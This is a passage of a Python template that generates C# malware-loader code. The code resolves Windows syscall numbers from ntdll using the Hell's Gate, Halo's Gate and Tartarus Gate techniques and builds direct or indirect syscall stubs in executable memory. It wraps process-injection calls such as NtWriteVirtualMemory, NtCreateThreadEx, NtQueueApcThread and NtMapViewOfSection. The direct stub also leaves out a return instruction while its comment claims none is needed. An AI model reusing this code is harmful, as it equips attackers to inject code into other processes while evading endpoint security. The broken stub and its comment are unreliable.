                    ushort numSections = BitConverter.ToUInt16(ntdllData, lfanew + 6);
                    ushort optHeaderSize = BitConverter.ToUInt16(ntdllData, lfanew + 20);
                    int sectionStart = lfanew + 24 + optHeaderSize;
                    for (int i = 0; i < numSections; i++)
                    {{
                        int off = sectionStart + i * 40;
                        uint secVa = BitConverter.ToUInt32(ntdllData, off + 12);
                        uint secVSize = BitConverter.ToUInt32(ntdllData, off + 8);
                        uint secRawOff = BitConverter.ToUInt32(ntdllData, off + 20);
                        if (rva >= secVa && rva < secVa + secVSize)
                            return (int)(rva - secVa + secRawOff);
                    }}
                    return (int)rva;
                }}

                private void ParseExports()
                {{
                    int lfanew = BitConverter.ToInt32(ntdllData, 60);
                    ushort numSections = BitConverter.ToUInt16(ntdllData, lfanew + 6);
                    ushort optHeaderSize = BitConverter.ToUInt16(ntdllData, lfanew + 20);
                    uint exportRva = BitConverter.ToUInt32(ntdllData, lfanew + 24 + 112);
                    if (exportRva == 0) return;

                    // Find .text section
                    int sectionStart = lfanew + 24 + optHeaderSize;
                    for (int i = 0; i < numSections; i++)
                    {{
                        int off = sectionStart + i * 40;
                        byte[] secName = new byte[8];
                        Array.Copy(ntdllData, off, secName, 0, 8);
                        string name = System.Text.Encoding.ASCII.GetString(secName).TrimEnd('\\0');
                        if (name == ".text")
                        {{
                            textBase = (int)BitConverter.ToUInt32(ntdllData, off + 20);
                            textSize = (int)BitConverter.ToUInt32(ntdllData, off + 16);
                            break;
                        }}
                    }}

                    int exportOff = RvaToOffset(exportRva);
                    uint numNames = BitConverter.ToUInt32(ntdllData, exportOff + 24);
                    uint namesRva = BitConverter.ToUInt32(ntdllData, exportOff + 32);
                    uint ordinalsRva = BitConverter.ToUInt32(ntdllData, exportOff + 36);
                    uint funcsRva = BitConverter.ToUInt32(ntdllData, exportOff + 28);

                    int namesOff = RvaToOffset(namesRva);
                    int ordinalsOff = RvaToOffset(ordinalsRva);
                    int funcsOff = RvaToOffset(funcsRva);

                    var targetSet = new System.Collections.Generic.HashSet<string>(targetFunctions);

                    for (uint i = 0; i < numNames; i++)
                    {{
                        uint nameRva = BitConverter.ToUInt32(ntdllData, namesOff + (int)(i * 4));
                        int nameOff = RvaToOffset(nameRva);
                        int end = nameOff;
                        while (end < ntdllData.Length && ntdllData[end] != 0) end++;
                        string funcName = System.Text.Encoding.ASCII.GetString(ntdllData, nameOff, end - nameOff);
                        ushort ordinal = BitConverter.ToUInt16(ntdllData, ordinalsOff + (int)(i * 2));
                        uint funcRva = BitConverter.ToUInt32(ntdllData, funcsOff + ordinal * 4);

                        if (funcName.StartsWith("Nt") || funcName.StartsWith("Zw"))
                        {{
                            int funcOffset = RvaToOffset(funcRva);
                            var entry = new SyscallEntry();
                            entry.Name = funcName;
                            entry.Rva = funcRva;
                            entry.FileOffset = funcOffset;
                            entry.Ssn = -1;
                            sortedStubs.Add(entry);
                        }}
                    }}

                    sortedStubs.Sort((a, b) => a.Rva.CompareTo(b.Rva));
                }}

                private int HellsGateRead(int offset)
                {{
                    if (offset + 8 > ntdllData.Length) return -1;
                    // 4c 8b d1 b8 XX XX 00 00
                    if (ntdllData[offset] == 0x4c && ntdllData[offset + 1] == 0x8b
                        && ntdllData[offset + 2] == 0xd1 && ntdllData[offset + 3] == 0xb8)
                    {{
                        return BitConverter.ToUInt16(ntdllData, offset + 4);
                    }}
                    return -1;
                }}

                private int HalosGateResolve(string targetName)
                {{
                    int targetIdx = -1;
                    for (int i = 0; i < sortedStubs.Count; i++)
                    {{
                        if (sortedStubs[i].Name == targetName)
                        {{
                            targetIdx = i;
                            break;
                        }}
                    }}
                    if (targetIdx < 0) return -1;

                    for (int dist = 1; dist < 64; dist++)
                    {{
                        int upIdx = targetIdx - dist;
                        if (upIdx >= 0)
                        {{
                            int ssn = HellsGateRead(sortedStubs[upIdx].FileOffset);
                            if (ssn >= 0) return ssn + dist;
                        }}
                        int downIdx = targetIdx + dist;
                        if (downIdx < sortedStubs.Count)
                        {{
                            int ssn = HellsGateRead(sortedStubs[downIdx].FileOffset);
                            if (ssn >= 0) return ssn - dist;
                        }}
                    }}
                    return -1;
                }}

                private int ResolveSsn(string funcName)
                {{
                    int targetIdx = -1;
                    for (int i = 0; i < sortedStubs.Count; i++)
                    {{
                        if (sortedStubs[i].Name == funcName)
                        {{
                            targetIdx = i;
                            break;
                        }}
                    }}
                    if (targetIdx < 0) return -1;

                    int offset = sortedStubs[targetIdx].FileOffset;

                    if (gateTechnique == GateTechnique.HellsGate)
                        return HellsGateRead(offset);

                    if (gateTechnique == GateTechnique.HalosGate)
                        return HalosGateResolve(funcName);

                    // TartarusGate
                    int ssn = HellsGateRead(offset);
                    if (ssn >= 0) return ssn;
                    return HalosGateResolve(funcName);
                }}

                private void ResolveAllSsns()
                {{
                    foreach (string func in targetFunctions)
                    {{
                        int ssn = ResolveSsn(func);
                        if (ssn >= 0)
                            ssnMap[func] = ssn;
                    }}
                }}

                private void FindSyscallGadget()
                {{
                    // Scan .text for 0F 05 C3 (syscall; ret)
                    for (int i = textBase; i < textBase + textSize - 2; i++)
                    {{
                        if (ntdllData[i] == 0x0f && ntdllData[i + 1] == 0x05 && ntdllData[i + 2] == 0xc3)
                        {{
                            IntPtr ntdllHandle = GetModuleHandle("ntdll.dll");
                            // Convert file offset to RVA
                            int lfanew = BitConverter.ToInt32(ntdllData, 60);
                            ushort numSec = BitConverter.ToUInt16(ntdllData, lfanew + 6);
                            ushort optSz = BitConverter.ToUInt16(ntdllData, lfanew + 20);
                            int secStart = lfanew + 24 + optSz;
                            for (int s = 0; s < numSec; s++)
                            {{
                                int sOff = secStart + s * 40;
                                byte[] sName = new byte[8];
                                Array.Copy(ntdllData, sOff, sName, 0, 8);
                                string nm = System.Text.Encoding.ASCII.GetString(sName).TrimEnd('\\0');
                                if (nm == ".text")
                                {{
                                    uint secVa = BitConverter.ToUInt32(ntdllData, sOff + 12);
                                    uint secRaw = BitConverter.ToUInt32(ntdllData, sOff + 20);
                                    uint gadgetRva = secVa + (uint)(i - (int)secRaw);
                                    gadgetAddr = new IntPtr(ntdllHandle.ToInt64() + gadgetRva);
                                    break;
                                }}
                            }}
                            break;
                        }}
                    }}
                }}

                private void BuildAllStubs()
                {{
                    foreach (string func in targetFunctions)
                    {{
                        if (!ssnMap.ContainsKey(func)) continue;
                        int ssn = ssnMap[func];
                        byte[] stub;

                        if (indirectMode && gadgetAddr != IntPtr.Zero)
                        {{
                            // mov r10,rcx; mov eax,SSN; jmp [gadget]
                            stub = new byte[21];
                            stub[0] = 0x4c; stub[1] = 0x8b; stub[2] = 0xd1; // mov r10, rcx
                            stub[3] = 0xb8;                                   // mov eax, SSN
                            Array.Copy(BitConverter.GetBytes(ssn), 0, stub, 4, 4);
                            stub[8] = 0xff; stub[9] = 0x25;                  // jmp [rip+0]
                            stub[10] = 0x00; stub[11] = 0x00; stub[12] = 0x00; stub[13] = 0x00;
                            Array.Copy(BitConverter.GetBytes(gadgetAddr.ToInt64()), 0, stub, 14, 8);
                        }}
                        else
                        {{
                            // Direct: mov r10,rcx; mov eax,SSN; syscall; ret
                            stub = new byte[10];
                            stub[0] = 0x4c; stub[1] = 0x8b; stub[2] = 0xd1;
                            stub[3] = 0xb8;
                            Array.Copy(BitConverter.GetBytes(ssn), 0, stub, 4, 4);
                            stub[8] = 0x0f; stub[9] = 0x05; // syscall
                            // no extra ret needed; callee convention returns via the stub
                        }}

                        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                        if (mem != IntPtr.Zero)
                        {{
                            Marshal.Copy(stub, 0, mem, stub.Length);
                            stubMap[func] = mem;
                        }}
                    }}
                }}

                public IntPtr GetStub(string funcName)
                {{
                    IntPtr addr;
                    if (stubMap.TryGetValue(funcName, out addr))
                        return addr;
                    return IntPtr.Zero;
                }}

                public int GetSsn(string funcName)
                {{
                    int ssn;
                    if (ssnMap.TryGetValue(funcName, out ssn))
                        return ssn;
                    return -1;
                }}
            }}

            // Delegate types for each wrapped syscall
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref ulong RegionSize, uint AllocationType, uint Protect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref ulong RegionSize, uint NewProtect, out uint OldProtect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtWriteVirtualMemoryDelegate(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, ulong Size, out ulong Written);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtCreateThreadExDelegate(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartRoutine, IntPtr Argument, uint CreateFlags, ulong ZeroBits, ulong StackSize, ulong MaxStackSize, IntPtr AttributeList);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtOpenProcessDelegate(out IntPtr ProcessHandle, uint Access, ref OBJECT_ATTRIBUTES_S ObjectAttributes, ref CLIENT_ID_S ClientId);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtQueueApcThreadDelegate(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArg1, IntPtr ApcArg2, IntPtr ApcArg3);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtSetContextThreadDelegate(IntPtr ThreadHandle, IntPtr Context);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtResumeThreadDelegate(IntPtr ThreadHandle, out uint SuspendCount);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtWaitForSingleObjectDelegate(IntPtr Handle, byte Alertable, IntPtr Timeout);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtCreateSectionDelegate(out IntPtr SectionHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES_S ObjectAttributes, ref long MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtMapViewOfSectionDelegate(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ulong CommitSize, ref long SectionOffset, ref ulong ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

            [StructLayout(LayoutKind.Sequential)]
            public struct OBJECT_ATTRIBUTES_S
            {{
                public int Length;
                public IntPtr RootDirectory;
                public IntPtr ObjectName;
                public uint Attributes;
                public IntPtr SecurityDescriptor;
                public IntPtr SecurityQualityOfService;

                public static OBJECT_ATTRIBUTES_S Create()
                {{
                    var oa = new OBJECT_ATTRIBUTES_S();
                    oa.Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES_S));
                    return oa;
                }}
            }}

            [StructLayout(LayoutKind.Sequential)]
            public struct CLIENT_ID_S
            {{
                public IntPtr UniqueProcess;
                public IntPtr UniqueThread;
            }}

            public static class SyscallWrappers
            {{
                private static SyscallResolver resolver;

                static SyscallWrappers()
                {{
                    resolver = new SyscallResolver();
                    resolver.Init();
                }}

                public static SyscallResult SyscallAlloc(IntPtr processHandle, IntPtr baseAddr, ulong size, uint allocType, uint protect)
                {{
                    var result = new SyscallResult();
                    IntPtr stub = resolver.GetStub("NtAllocateVirtualMemory");
                    if (stub == IntPtr.Zero) {{ result.Status = -1; return result; }}
                    var fn = (NtAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemoryDelegate));
                    IntPtr baseAddress = baseAddr;
                    ulong regionSize = size;
                    result.Status = fn(processHandle, ref baseAddress, IntPtr.Zero, ref regionSize, allocType, protect);
                    result.Value = baseAddress;
                    return result;
                }}

                public static SyscallResult SyscallProtect(IntPtr processHandle, IntPtr baseAddr, ulong size, uint newProtect)
                {{
                    var result = new SyscallResult();
                    IntPtr stub = resolver.GetStub("NtProtectVirtualMemory");
                    if (stub == IntPtr.Zero) {{ result.Status = -1; return result; }}
                    var fn = (NtProtectVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemoryDelegate));
                    IntPtr baseAddress = baseAddr;
                    ulong regionSize = size;
                    uint oldProtect;
                    result.Status = fn(processHandle, ref baseAddress, ref regionSize, newProtect, out oldProtect);
                    result.Value = new IntPtr(oldProtect);
                    return result;
                }}

                public static int SyscallWrite(IntPtr processHandle, IntPtr baseAddr, byte[] buffer)
                {{
                    IntPtr stub = resolver.GetStub("NtWriteVirtualMemory");
                    if (stub == IntPtr.Zero) return -1;
                    var fn = (NtWriteVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemoryDelegate));
                    IntPtr bufPtr = Marshal.AllocHGlobal(buffer.Length);
                    Marshal.Copy(buffer, 0, bufPtr, buffer.Length);
                    ulong written;
                    int status = fn(processHandle, baseAddr, bufPtr, (ulong)buffer.Length, out written);
                    Marshal.FreeHGlobal(bufPtr);
                    return status;
                }}

                public static SyscallResult SyscallCreateThread(IntPtr processHandle, IntPtr startAddr, IntPtr parameter)
                {{
                    var result = new SyscallResult();
                    IntPtr stub = resolver.GetStub("NtCreateThreadEx");
                    if (stub == IntPtr.Zero) {{ result.Status = -1; return result; }}
                    var fn = (NtCreateThreadExDelegate)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadExDelegate));
                    IntPtr threadHandle;
                    result.Status = fn(out threadHandle, 0x001FFFFF, IntPtr.Zero, processHandle, startAddr, parameter, 0, 0, 0, 0, IntPtr.Zero);
                    result.Value = threadHandle;
                    return result;
                }}

                public static SyscallResult SyscallOpenProcess(uint pid, uint access)
                {{
                    var result = new SyscallResult();
                    IntPtr stub = resolver.GetStub("NtOpenProcess");
                    if (stub == IntPtr.Zero) {{ result.Status = -1; return result; }}
                    var fn = (NtOpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcessDelegate));
                    IntPtr procHandle;
                    var oa = OBJECT_ATTRIBUTES_S.Create();
                    var cid = new CLIENT_ID_S();
                    cid.UniqueProcess = new IntPtr(pid);
                    cid.UniqueThread = IntPtr.Zero;
                    result.Status = fn(out procHandle, access, ref oa, ref cid);
                    result.Value = procHandle;
                    return result;
                }}

                public static int SyscallQueueApc(IntPtr threadHandle, IntPtr apcRoutine, IntPtr arg)
                {{
                    IntPtr stub = resolver.GetStub("NtQueueApcThread");
                    if (stub == IntPtr.Zero) return -1;
                    var fn = (NtQueueApcThreadDelegate)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtQueueApcThreadDelegate));
                    return fn(threadHandle, apcRoutine, arg, IntPtr.Zero, IntPtr.Zero);
                }}

                public static int SyscallSetContext(IntPtr threadHandle, IntPtr context)
                {{
                    IntPtr stub = resolver.GetStub("NtSetContextThread");
                    if (stub == IntPtr.Zero) return -1;
                    var fn = (NtSetContextThreadDelegate)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtSetContextThreadDelegate));
                    return fn(threadHandle, context);
                }}

                public static int SyscallResumeThread(IntPtr threadHandle)
                {{
                    IntPtr stub = resolver.GetStub("NtResumeThread");
                    if (stub == IntPtr.Zero) return -1;
                    var fn = (NtResumeThreadDelegate)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtResumeThreadDelegate));
                    uint suspendCount;
                    return fn(threadHandle, out suspendCount);
                }}

                public static int SyscallWait(IntPtr handle, int? timeoutMs)
                {{
                    IntPtr stub = resolver.GetStub("NtWaitForSingleObject");
                    if (stub == IntPtr.Zero) return -1;
                    var fn = (NtWaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWaitForSingleObjectDelegate));
                    if (!timeoutMs.HasValue)
                        return fn(handle, 0, IntPtr.Zero);
                    long ticks = -((long)timeoutMs.Value * 10000);
                    IntPtr pTimeout = Marshal.AllocHGlobal(8);
                    Marshal.WriteInt64(pTimeout, ticks);
                    int status = fn(handle, 0, pTimeout);
                    Marshal.FreeHGlobal(pTimeout);
                    return status;
                }}

                public static SyscallResult SyscallCreateSection(uint access, long size, uint protect, uint attributes)
                {{
                    var result = new SyscallResult();
                    IntPtr stub = resolver.GetStub("NtCreateSection");
                    if (stub == IntPtr.Zero) {{ result.Status = -1; return result; }}
                    var fn = (NtCreateSectionDelegate)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateSectionDelegate));
                    IntPtr sectionHandle;
                    var oa = OBJECT_ATTRIBUTES_S.Create();
                    long maxSize = size;
                    result.Status = fn(out sectionHandle, access, ref oa, ref maxSize, protect, attributes, IntPtr.Zero);
                    result.Value = sectionHandle;
                    return result;
                }}

                public static SyscallResult SyscallMapView(IntPtr sectionHandle, IntPtr processHandle, ulong size, uint protect)
                {{
                    var result = new SyscallResult();
                    IntPtr stub = resolver.GetStub("NtMapViewOfSection");
                    if (stub == IntPtr.Zero) {{ result.Status = -1; return result; }}
                    var fn = (NtMapViewOfSectionDelegate)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtMapViewOfSectionDelegate));
                    IntPtr baseAddress = IntPtr.Zero;
                    ulong viewSize = size;
                    long sectionOffset = 0;
                    result.Status = fn(sectionHandle, processHandle, ref baseAddress, IntPtr.Zero, 0, ref sectionOffset, ref viewSize, 2, 0, protect);
                    result.Value = baseAddress;
                    return result;
                }}
            }}
        }}""").format(gate_technique=gate_csharp, indirect_mode=mode_flag)
